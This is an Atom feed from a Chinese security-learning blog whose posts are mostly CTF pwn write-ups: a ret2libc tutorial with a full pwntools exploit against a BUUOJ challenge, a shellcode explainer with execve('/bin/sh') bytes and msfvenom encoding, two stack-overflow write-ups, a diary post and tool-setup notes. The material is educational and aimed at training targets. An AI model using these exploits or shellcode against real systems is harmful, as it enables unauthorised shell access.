<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://meowketer.github.io</id>
    <title>Winghr&apos;s Blog</title>
    <updated>2020-03-26T15:55:39.639Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://meowketer.github.io"/>
    <link rel="self" href="https://meowketer.github.io/atom.xml"/>
    <subtitle>十日画一水，五日画一圆。</subtitle>
    <logo>https://meowketer.github.io/images/avatar.png</logo>
    <icon>https://meowketer.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, Winghr&apos;s Blog</rights>
    <entry>
        <title type="html"><![CDATA[有关ret2libc利用方法的整理]]></title>
        <id>https://meowketer.github.io/post/p=1/</id>
        <link href="https://meowketer.github.io/post/p=1/">
        </link>
        <updated>2020-03-26T13:33:13.000Z</updated>
        <content type="html"><![CDATA[<p>ret2libc是栈溢出漏洞利用的一种常见手段。这种漏洞利用方式结合了很多利用方法及系统机制，如ROP技术、linux延迟绑定机制等。本文结合近期练习的几道ret2libc漏洞CTF题目，归纳其利用的过程。</p>
<h2 id="原理">原理</h2>
<p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置(即函数对应的 got表项的内容)。一般情况下，我们会选择执行 system(&quot;/bin/sh&quot;)，故而此时我们需要知道 system 函数的地址。首先先解释一下上面出现的一些名词。</p>
<h3 id="libc是啥">libc是啥？</h3>
<p>libc 是 Linux 下的 ANSI C 函数库。是C语言最基本的库函数。可以把它理解为可执行程序的运行依赖。</p>
<h3 id="pltgot">PLT&amp;GOT</h3>
<p>linux下的动态链接是通过PLT&amp;GOT来实现的，动态链接每个函数需要两个东西：<br>
1、用来存放外部函数地址的数据段<br>
2、用来获取数据段记录的外部函数地址的代码<br>
对应有两个表，一个用来存放外部的函数地址的数据表称为全局偏移表（GOT, Global Offset Table），那个存放额外代码的表称为程序链接表（PLT，Procedure Link Table）<br>
<img src="https://meowketer.github.io/post-images/1585232895786.jpeg" alt="" loading="lazy"><br>
可执行文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT 的地址，GOT 表指向的就是 glibc 中的地址<br>
那我们可以发现，在这里面想要通过 plt 表获取函数的地址，首先要保证 got 表已经获取了正确的地址，但是在一开始就进行所有函数的重定位是比较麻烦的，为此，linux 引入了延迟绑定机制</p>
<h3 id="延迟绑定机制">延迟绑定机制</h3>
<p>只有动态库函数在被调用时，才会地址解析和重定位工作。简单来讲，在一个binary运行的过程中，只有真正运行过的函数才真正被调用真实地址运行。当一个功能模块未被加载使用的时候，比如准备调用一个函数，会通过先在PLT表找到记录相对的GOT表项的内容，即可跳转真实地址运行调用函数。也就是所谓的地址解析和重定位。</p>
<h2 id="一个实例">一个实例</h2>
<p>在上面整理了相关的理论原理，通过下面的这道题目来对应实践上述内容。这个binary来自BUUOJ的ciscn_2019_c_1难度不大，刚刚好是re2libc的利用漏洞。<br>
<img src="https://meowketer.github.io/post-images/1585234609391.png" alt="" loading="lazy"><br>
程序根据不同的选项有不同的功能，载入ida中查看一下：<br>
<img src="https://meowketer.github.io/post-images/1585234863292.png" alt="" loading="lazy"><br>
可以看到在encrypt函数内存在栈溢出漏洞。对应程序的功能选项则为1选项。<br>
<img src="https://meowketer.github.io/post-images/1585235183513.png" alt="" loading="lazy"><br>
但是这里的算法会将我们输入的内容加密处理，这样我们构造payload时就无法直接实现我们攻击流程。所以第一步需要对这个算法进行处理。在这个算法中注意到strlen函数，这个函数的主要特性如下：strlen所作的是一个计数器的工作，它从内存的某个位置（可以是字符串开头，中间某个位置，甚至是某个不确定的内存区域）开始扫描，直到碰到第一个字符串结束符'\0'为止，然后返回计数器值(长度不包含'\0')。因此在这里我们只需要在payload开始的部分加入'\0'字符即可完成绕过。<br>
还有一个需要注意的点就是，程序远程运行在乌班图18.04的环境下，因此在构造系统调用时需要使用ret先对齐。</p>
<h2 id="利用思路">利用思路</h2>
<p>1.在漏洞函数输入前，有这样一段内容puts(&quot;Input your Plaintext to be encrypted&quot;)；所以puts函数在我们输入前就已将运行完一遍了，因此可以尝试泄露这个函数的地址来获取目标系统中使用的libc版本。因此构造第一段payload,泄露这个puts函数的地址。payload如下：</p>
<pre><code>payload = '\0' + (0x50-1 + 8)*'a' + p64(pop_rdi) + p64(puts_got)
payload+= p64(puts_plt) + p64(main) 
</code></pre>
<p>首先就是用\0绕过加密算法，在补齐构造栈溢出的无用字符a，溢出后接ROP链再通过puts函数的plt表地址和got表地址泄露出puts真实的地址。最后在跳转回程序的开始，接第二段payload。</p>
<p>2.完成泄露后，使用 LibcSearcher 模块link出来libc基地址，并进一步通过libc基地址加偏移的方法找到libc中的system地址及/bin/sh地址从而完成系统调用。代码如下：</p>
<pre><code>libc = LibcSearcher('puts',puts)
libc_addr=puts-libc.dump('puts')
binsh=libc_addr+libc.dump('str_bin_sh')
system=libc_addr+libc.dump('system')
</code></pre>
<p>3.构造第二次payload，这次为系统调用。将上一步骤中link出来的一些地址构造入payload中：</p>
<pre><code>payload1 = '\0'+(0x50-1+8)* &quot;b&quot; + p64(ret_addr) + p64(pop_rdi) 
payload1+= p64(binsh) + p64(system)
</code></pre>
<p>溢出后跳转到system（/bin/sh）从而完成系统调用，我想这里就不需要解释了。</p>
<h2 id="完整exp">完整exp</h2>
<pre><code> from pwn import * 
from LibcSearcher import LibcSearcher
context.os='linux'
context.arch='amd64'
context.log_level='debug'
elf = ELF(&quot;./6&quot;)
puts_plt = elf.plt[&quot;puts&quot;]
puts_got = elf.got[&quot;puts&quot;]
main = elf.symbols[&quot;main&quot;]
pop_rdi = 0x400c83
ret_addr = 0x4006b9
def get64addr():
    return u64(io.recvuntil('\n')[:-1].ljust(8,'\0'))
#io = process('./6')
io=remote('node3.buuoj.cn',29305)
io.sendlineafter(&quot;choice!\n&quot;,&quot;1&quot;)
payload = '\0' + (0x50-1 + 8)*'a' + p64(pop_rdi) + p64(puts_got)
payload+= p64(puts_plt) + p64(main) 
io.sendlineafter('encrypted\n',payload)
io.recvline()
io.recvline()
puts = get64addr()
print hex(puts)
libc = LibcSearcher('puts',puts)
libc_addr=puts-libc.dump('puts')
binsh=libc_addr+libc.dump('str_bin_sh')
system=libc_addr+libc.dump('system')
io.sendlineafter('choice!\n','1')
payload1 = '\0'+(0x50-1+8)* &quot;b&quot; + p64(ret_addr) + p64(pop_rdi) 
payload1+= p64(binsh) + p64(system)
io.sendlineafter('encrypted\n',payload1)
io.interactive()

</code></pre>
<h1 id="总结">总结</h1>
<p>通过示例程序我们可以直观的看到，ret2libc的利用过程，其中，包含了对PLT表及GOT表来完成地址泄露，并通过泄露的地址判断libc版本，从而进一步link出libc的基地址及与其相对偏移的系统调用参数地址。最终完成了系统调用。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[shellcode相关知识整理]]></title>
        <id>https://meowketer.github.io/post/shellcode/</id>
        <link href="https://meowketer.github.io/post/shellcode/">
        </link>
        <updated>2020-01-28T15:21:30.000Z</updated>
        <content type="html"><![CDATA[<h2 id="0x1概述">0x1概述</h2>
<p>shellcode是binary堆栈溢出中常见的一种利用手段。顾名思义，shell指的就是Linux里用户与内核进行交互操作的一种接口，它通常具备一定的访问控制权限。code则是表示一段代码。合起来shellcode便有着恶意代码的意思。<br>
在存在一些漏洞的程序上使用shellcode很多情景下会对程序甚至系统产生严重的危害。例如非法完成系统调用，打开一个远程设备的shell。劫持程序的控制流读取一些路径下的文件数据。以及完成关机命令系统的调用等等。<br>
在反复对栈溢出进行学习的过程接触了shellcode相关的一些知识，俗话说得好：好记性不如烂笔头。抽空对学过的知识进行总结总是好的。</p>
<h2 id="0x2-shellcode原理">0x2 shellcode原理</h2>
<p>从binary底层的角度出发，所有的程序运行的代码最终都转化为二进制的0和1在CPU中运算而实现的。二进制0.1代码向上层整合为机器码、汇编语言、以及开发时使用的高级语言。在这里我们在汇编的部分进行实验观察，来探寻一下shellcode在底层的原理，先整过来一段shellcode瞅瞅看：</p>
<pre><code class="language-bash">shellcode = &quot;\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\
xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34&quot;
</code></pre>
<p>这些16进制的字符串叫做opcode。opcode由最多6个域组成，是和汇编指令对于的机器码。<br>
这段机器码对应的汇编为：</p>
<pre><code class="language-bash">asm {                           
  global _start
  _start:
  xor eax,eax   //eax置0
  xor edx,edx   //edx置0
  push edx
  push &quot;/sh&quot;
  push &quot;/bin&quot;   //将/bin/sh入栈
  mov ebx,esp   //ebx指向/bin/sh这个字符串
  xor ecx,ecx
  mov al,0Bh    //eax置为execve函数的中断号
  int 80h       //调用软中断
}
</code></pre>
<p>在这段汇编当中对应完成的就是完成一次系统调用：打开一个/bin/bash 的shell</p>
<h2 id="0x4系统调用">0x4系统调用</h2>
<p>在上面shellcode的原理部分提到了系统调用。在这儿我们具体看看系统调用是啥：<br>
首先贴一个网站：<a href="http://syscalls.kernelgrok.com/">http://syscalls.kernelgrok.com/</a><br>
<img src="https://img-blog.csdnimg.cn/20200128213427243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21hY3JvX3dpbmc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
在这里我们可以看到sys_execve编号的系统调用在寄存器中的具体格式是这样的<br>
1.将系统调用号传到eax中。<br>
2.ebx用于保存函数调用的第一个参数（ecx存放第二个参数，edx存放第三个参数，esi存放第四个参数，edi存放第五个参数）<br>
3.ecx与edx的值应相等。<br>
4.调用int 0x80 汇编指令来出发系统软中断，强迫内核暂停手头上的工作并处理该中断。<br>
此时对应我们上文的汇编指令就很清晰了：EAX = 0xb = 11，EBX = &amp;(“/bin//sh”), ECX = EDX = 0，再调用int 0x80 ,即执行了sys_execve(&quot;/bin//sh&quot;, 0, 0, 0)从而完成系统调用。</p>
<h2 id="0x5-一次直观的shellcode使用">0x5 一次直观的shellcode使用</h2>
<p><img src="https://img-blog.csdnimg.cn/20200128223400774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21hY3JvX3dpbmc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
在这里我们通过向一个binary程序栈溢出后在其中的一块bss段写入一段shellcode可以看到它执行了系统调用并打开了程序所在系统的shell拥有root权限可使用bash命令进行对系统例如文件遍历的操作。</p>
<h2 id="0x6-shellcode的伪装">0x6 shellcode的伪装</h2>
<p>在很多情况下，shellcode是无法想当然就能任意达到使用条件的。例如程序使用scanf函数来获取一段char类型的字符串，将这段字符串则遇到&quot;\0&quot;就会截断转到对应的地址。再例如通过输入函数读入的数据有格式限制或者输入内容通过其他的功能函数转化为其他字符串类型。都会造成我们的shellcode失效。在这里主要的问题如下：存在有输入限制的功能模块使得一些字符被过滤无法继续组成原本shellcode的情况。这就需要对shellcode进行处理：<br>
在这儿我们使用kali下的msfvenom这个msf框架下的一个工具。<br>
<img src="https://img-blog.csdnimg.cn/20200128230640377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21hY3JvX3dpbmc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
我们可以通过对应的参数来选择适合的，符合相关条件的编码参数。例如我们要过滤有\0x00字符的内容。<br>
接下来我们来尝试绕过限制输入只能是base编码限制的情况下对shellcode进行编码：<br>
<img src="https://img-blog.csdnimg.cn/20200128232844712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21hY3JvX3dpbmc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
这样我们就可以将一段机器码转化为base64的格式<br>
<img src="https://img-blog.csdnimg.cn/20200128233019835.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21hY3JvX3dpbmc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
在这个程序中可以看到我们输入的buf会转化为base64格式后转化成函数指针调用执行。<br>
这里我们可以将刚刚的那段shellcode输入看能否获取shell:<br>
<img src="https://img-blog.csdnimg.cn/20200128234317576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21hY3JvX3dpbmc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
这儿充分说明shellcode的格式在一些情况下需要进行编码调整来完成‘’伪装‘’。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Test]]></title>
        <id>https://meowketer.github.io/post/test/</id>
        <link href="https://meowketer.github.io/post/test/">
        </link>
        <updated>2019-12-21T15:31:00.000Z</updated>
        <content type="html"><![CDATA[<p>测试格式🤠<img src="https://meowketer.github.io/post-images/1584804700063.jpg" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[sctf_2016]]></title>
        <id>https://meowketer.github.io/post/sctf_2016/</id>
        <link href="https://meowketer.github.io/post/sctf_2016/">
        </link>
        <updated>2019-12-08T15:40:02.000Z</updated>
        <content type="html"><![CDATA[<h2 id="这是一个简单栈溢出-binary-同时整理">这是一个简单栈溢出 binary ，同时整理</h2>
<p>字符串所在空间偏移大小的分析过程</p>
<p>由于对汇编掌握还不够深入，及时对知识点总结就比较重要了。</p>
<p><strong>0x1 运行 binary 查看基本流程及保护</strong><br>
<img src="https://meowketer.github.io/post-images/1584978068729.png" alt="" loading="lazy"><br>
binary 是 32 位的 ELF 文件，保护只开启了 NX，流程来看大概是输入一个字符出会反回你输入的内容。在结合随后的静态分析发现当输入''I 时会返回'you'。。<br>
<img src="https://meowketer.github.io/post-images/1584978079600.png" alt="" loading="lazy"><br>
与此同时发现使用 fgets 函数接收字符串儿时限制的输入长度最大为 32 以内。</p>
<p><strong>0x2 分析输入字符串在栈中的偏移</strong><br>
这里先使用 ida 查看程序功能模块所在的代码段：<br>
<img src="https://meowketer.github.io/post-images/1584978090458.png" alt="" loading="lazy"></p>
<p>在这里可以看到输入的字符串是通过相对于 esp 的索引，需要进行调试，将断点下在_fgets call 处。接下来使用 gdb 动态调试：<br>
<img src="https://meowketer.github.io/post-images/1584978122498.png" alt="" loading="lazy"></p>
<p>流程是先下断 b* 0x080491d9 ---&gt; 运行程序 r ---&gt; 单步至输入字符串。  过程中进行分析。<br>
在这里，lea eax, [ebp - 0x3c] 是把 ebp - 0x3c 这个地址里面保存的内容拿出来给 eax<br>
mov dword ptr [esp], eax  是把 eax 里面的内容拿出来给 esp 指向的地址<br>
读入的字符串儿存储在以 ebp+s 为首地址的地方<br>
用于分配储存字符串的大小 相对于 ebp 有 0x3c 的偏移，理论上这里储存数据的的栈空间最大为 0x3c 因而在 32 位 binary 中造成栈溢出需要 0x3c+4 的长度。</p>
<p><strong>0x3 构造溢出完成系统调用</strong><br>
在最初的静态分析中注意到 fgets 函数限制了输入长度为 32 以内，显然不足以覆盖 64 个字符长度。但是程序只有这一个交互点。<br>
这里可以利用输入字符串'I'程序转化为'you'这个条件来为我们构造出来足够长度的字符串儿 。因此构造'I'*21 在程序中相当于输入了 63 个字符。在加一个字符即可完成 64 位长度的覆盖。<br>
<img src="https://meowketer.github.io/post-images/1584978131488.png" alt="" loading="lazy"><br>
在程序段可以找到系统指令调用地址。因而完成溢出后跳转这个地址即可。</p>
<p><strong>0x4 EXP</strong><br>
<img src="https://meowketer.github.io/post-images/1584978164074.png" alt="" loading="lazy"></p>
<figure data-type="image" tabindex="1"><img src="https://meowketer.github.io/post-images/1584978147689.png" alt="" loading="lazy"></figure>
<p>如有错误请多包涵 ❤️</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[XCTF-pwn-stack2 - Writeup]]></title>
        <id>https://meowketer.github.io/post/pwn1-writeup/</id>
        <link href="https://meowketer.github.io/post/pwn1-writeup/">
        </link>
        <updated>2019-11-28T14:35:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="偶尔在学习的阶段慢慢发现的进步-抽空写点笔记记录一下子">偶尔在学习的阶段慢慢发现的进步 抽空写点笔记记录一下子</h3>
<hr>
<p>这次做的题目还是栈溢出漏洞的题目但是并没用用到payload，简单用了下ROP</p>
<h2 id="题目描述">题目描述</h2>
<p>除了一个名称 stack2   题目描述是：暂无</p>
<p>下载附件运行一下看看流程<br>
<img src="https://img-blog.csdnimg.cn/20191128204952145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21hY3JvX3dpbmc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
保护开启了nx 和canary<br>
流程大概是提供了4个选项的功能：加数、改数还有求平均数啥的。<br>
然后丢到iad里看一下这部分的流程简单分析一下漏洞点。<br>
<img src="https://img-blog.csdnimg.cn/20191128205400453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21hY3JvX3dpbmc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
在这里看还是蛮正常的，继续向下看功能模块：<br>
<img src="https://img-blog.csdnimg.cn/20191128205647845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21hY3JvX3dpbmc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
在这里可以看到三号选项的功能模块对输入的数值没有做任何限制<br>
没有检查输入数组的边界就意味着可以任意输入<br>
因此在这里造成栈溢出而劫持eip<br>
然后就大概有接下来的思路了：寻找或者构造system(&quot;/bin/sh&quot;)来控制程序流程获取shell。<br>
<img src="https://img-blog.csdnimg.cn/20191128210615849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21hY3JvX3dpbmc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
system在plt表中的地址为0x8048450<br>
<img src="https://img-blog.csdnimg.cn/20191128210846175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21hY3JvX3dpbmc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
程序中没有/bin/sh 但是找到了这个个东东 但是/bin/bash 中的bash是不能调用bash命令的，所以在这里构造system(sh)一样能完成调用<br>
sh所在的地址位0x8048980 + 7 （空过前面的/bin/ba 读取sh）<br>
计算漏洞点在栈中的偏移，从返回地址retn到输入的地方偏移为0x84</p>
<h1 id="exp">exp:</h1>
<p><img src="https://img-blog.csdnimg.cn/20191128211704415.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21hY3JvX3dpbmc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
跑一下成功得到shell<br>
<img src="https://img-blog.csdnimg.cn/20191128211946403.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21hY3JvX3dpbmc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[过去的一个月干了些啥？]]></title>
        <id>https://meowketer.github.io/post/life1/</id>
        <link href="https://meowketer.github.io/post/life1/">
        </link>
        <updated>2019-10-29T14:30:07.000Z</updated>
        <content type="html"><![CDATA[<h2 id="正如标题所讲的在过去一个月或许更久一点的时间当中相对于我个人来讲是比较忙碌的-">正如标题所讲的，在过去一个月或许更久一点的时间当中相对于我个人来讲是比较忙碌的----<br>
<img src="https://img-blog.csdnimg.cn/20191029213507113.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21hY3JvX3dpbmc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></h2>
<h1 id="生活">生活</h1>
<p>对每一个人来讲可能都是匆匆闪过一般，每个人对待生活的态度与方式是不同滴。大概每个人都在过所谓自己最喜欢的样子吧。</p>
<p>生活是每个人的日常到不能再日常的基础，每天早上睁眼看到的天空，或许是雾蒙蒙的一片，也或许是刺眼的阳光，再或者是会是白云慢慢浮过干净的蓝天。。</p>
<p>每天都有新的变化而不是千篇一律大概就是我认为的一种常态。<br>
还好，在过去的一个月算是有点收获吧。虽然时间依然匆匆，记不得时间流逝的感觉，但看得见回过头来走过远远的路。</p>
<h1 id="过去一个月的日志">过去一个月的日志</h1>
<p>嗯，仔细想了想这部分叫日志比较适合，不再是小时候写流水账的日记那样从头到尾叙述一件事情了。慢慢长大，要做的事情越来越多。早就没有时间每天或者隔几天写个日记啥的了。 现在只是会把重要的事情整理一下，也许不久后忘记所有细节的那一刻可以回头来看看。说不定还可以对着自己的过去笑笑~<br>
<img src="https://img-blog.csdnimg.cn/2019102921354324.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21hY3JvX3dpbmc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p>
<h2 id="团队">团队</h2>
<p>团队是在过去一个月当中我认为值得总结的一点。很幸运有一群还算志同道合的朋友们围在一起做了一个小团队。 团队围绕学校的同学们做了几件不同类型的服务项目，例如开发运营了学校的失物招领小程序，校内直播平台，自动问答机器人等等。也为校团委组织的学校约200个社团纳新活动拍摄了宣传片。还算是做了几件有意义的事情。<br>
<img src="https://img-blog.csdnimg.cn/2019102921361053.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21hY3JvX3dpbmc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p>
<h3 id="宣传片">宣传片</h3>
<p>针对于学校中算是较大的全体社团纳新的活动，我们完成了这个题材的宣传片。完成度还算满意。在整个视频的制作过程当中我印象十分深刻。在这次制作的过程担任的是制片人的工作。第一次做这样的一种工作，虽然很多事情还不懂但是把目标二十余个组织的时间地点内容等，以及我们团队人员的具体时间协调好是我必须做好的事情了。每天晚上协调到两点左右，早上七点在爬起来做一天的准备工作。接着就是连请假带旷课的把时间挤出来，与团队的摄影场务等人员一起把导演分镜的每一个细节尽可能拍摄出来。<br>
印象深刻的有这几个片段：有天中午拍摄航模队的航模起飞镜头，联系好的航模队同学在拍摄时间突然被通知中午开班会，但是那天他给我的反馈是不能耽误约定好的拍摄，他按照协定的时间内容一起来完成分镜。从他的身上感受到了责任心的体现。<br>
另一个片段则形成了鲜明的对比，化学相关协会的同学在一天上午完成对接后，因为场地问题没有解决没有及时与我对接协商相关问题，甚至在约定好的时间都还呆在宿舍里。好在之后通过联系一个也在药学院的学姐解决了场地问题才完成了原计划的内容。<br>
也有一次拍摄两个摄影小哥哥提前说晚来10分钟，直到到下午四点多很认真拍完三个镜头之后才说他们还没吃午饭。。。。<br>
这几件事情不能客观的去分辨他们的性质，更多的需要我自己去思考时候我总结学习到了什么。无论好的事情还是坏的事情都是成长必须的经历。都是进步的阶梯。<br>
在为期6天的拍摄和3天的后期当中从头到尾都参与的我，没搞懂啥是制片人，但是看到了团队每个人的辛勤劳动，大家齐心协力来做一件事情我很享受这样的团队。<br>
所以即便忙来忙去，但是一点没有觉得累~~<br>
<img src="https://img-blog.csdnimg.cn/20191029213759652.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21hY3JvX3dpbmc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p>
<h3 id="团队建设">团队建设</h3>
<p>在团队建设方面，在一周前从160人当中又纳新了8位适合的新成员。团队越来越成体系了。在上周五的晚上我主持召开了我们团队的部门构建暨下阶段工作安排的全体会议。在讲完会议的主要内容后我总是在跟大家探讨团队凝聚力，具体每个部门的协调，无非就是每个人各司其职，做自己喜欢或擅长的事情的同时把手头上的事情做好罢了。大家其心协力来构建一份属于我们的价值就好了。团队前后的点点滴滴在我的眼中是一个很温暖的team辽!!能看到每个人做事的态度认真之外便是精益求精。天道酬勤我想团队会越来越棒。<br>
<img src="https://img-blog.csdnimg.cn/20191029213820462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21hY3JvX3dpbmc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p>
<h2 id="网络安全">网络安全</h2>
<p>在空闲之余就抓空学习看一些pwn栈溢出的基本ROP啥的，相比于专一的学习网络安全来讲，过去一个月没有什么太多的收获，只是中规中矩的有点收获。用了一点点时间为报名了我们学校信息安全协会的同学们录了点校内CTF平台练习题的视频WP之后。大半个月只是迷迷糊糊的了解了点got表啊，泄露__libc_start_main在libc中的地址啊，用gadget构造一些简单的系统调用攻击链啊这些我觉得还是一堆乱七八糟浆糊的东东<br>
一如既往的菜，，，，</p>
<hr>
<p>说好的不再像是小时候那样记流水账了所以这些便是我认为过去一个月充斥我大部分生活的故事了~</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[关于安装pwn环境~]]></title>
        <id>https://meowketer.github.io/post/pwnhj/</id>
        <link href="https://meowketer.github.io/post/pwnhj/">
        </link>
        <updated>2019-09-15T14:24:05.000Z</updated>
        <content type="html"><![CDATA[<h2 id="第一步pwntools的安装">第一步pwntools的安装</h2>
<p>其实也不算严格意义上的第一步啦<br>
一般都是在win系统下+Linux虚拟机 所以首先得要装一个虚拟机呐<br>
在这儿我用了64位的kali 因为kali上集成的大量工具都有经常用到<br>
这样把pwn环境搭在kali上就不用用好几个虚拟机切来切去的麻烦辽<br>
但是有听大佬说 多准备几个虚拟机 ubuntu 14.04 16.04 18.04都要有<br>
不同版本是为了应对不同的glibc调试<br>
所以一个kali看样子不能满足很多很多的情况，但是对于初期来看应该是够了的</p>
<h3 id="开始安装pwntools">开始安装pwntools</h3>
<p>安装的命令很简单</p>
<pre><code>pip install pwntools
</code></pre>
<p>关于什么是pwntools ,官方文档中是这样说的： pwntools是一个CTF框架和漏洞利用开发库。它以Python编写，专为快速原型设计和开发而设计，旨在使漏洞利用编写尽可能简单。<br>
所以看样子是学习pwn的利器<br>
具体操作一下是这个亚子：<br>
<img src="https://img-blog.csdnimg.cn/20190915135022623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21hY3JvX3dpbmc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
当然也可以这样：<br>
在中端输入下面的内容</p>
<pre><code>git clone https://github.com/Gallopsled/pwntools
cd pwntools
python setup.py install
</code></pre>
<p>就不给大家演示咯~</p>
<h2 id="2安装capstone">2.安装Capstone</h2>
<p>当然也是差不多的样子</p>
<pre><code>git clone https://github.com/aquynh/capstone
cd capstone
make
make install
</code></pre>
<p>这时候pwntools差不多就算是安装完了<br>
打开一个python的小窗口导入一下pwn试试看<br>
<img src="https://img-blog.csdnimg.cn/20190915135750774.png" alt="在这里插入图片描述" loading="lazy"><br>
差不多这个样子就问题不大了。</p>
<h2 id="安装peda">安装peda</h2>
<p>gdb-peda：gdb方便调试的工具，类似的工具有gef，gdbinit。<br>
安装也很简单</p>
<pre><code> git clone https://github.com/longld/peda.git ~/peda
 echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit
</code></pre>
<p>装完就可以方便的调试了：<br>
<img src="https://img-blog.csdnimg.cn/2019091514024848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21hY3JvX3dpbmc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
到此为止pwn的基本环境就差不多能用辽^_*</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[编程学习基础－－进制学习笔记整理（下）]]></title>
        <id>https://meowketer.github.io/post/jinzhixia/</id>
        <link href="https://meowketer.github.io/post/jinzhixia/">
        </link>
        <updated>2019-08-08T14:18:29.000Z</updated>
        <content type="html"><![CDATA[<h1 id="五原码反码补码">五.原码反码补码</h1>
<h3 id="编码规则">编码规则</h3>
<p>不同文件有不同的编码规则<br>
11010101<br>
无符号数当中0xD5 213 有符号数时并非-213</p>
<p>正数的原码反码补码相同<br>
表示： 1 00000001 6 00000110</p>
<h3 id="正数的原码补码在计算机中的表示">正数的原码补码在计算机中的表示</h3>
<pre><code>int main(int argc,char*argv[])
{
    char x = 1;             #用到的数据宽度为8位
    printf(&quot;%x\n&quot;,&amp;x);   #打印一下这个值在内存中的位置
    return 0;
}

</code></pre>
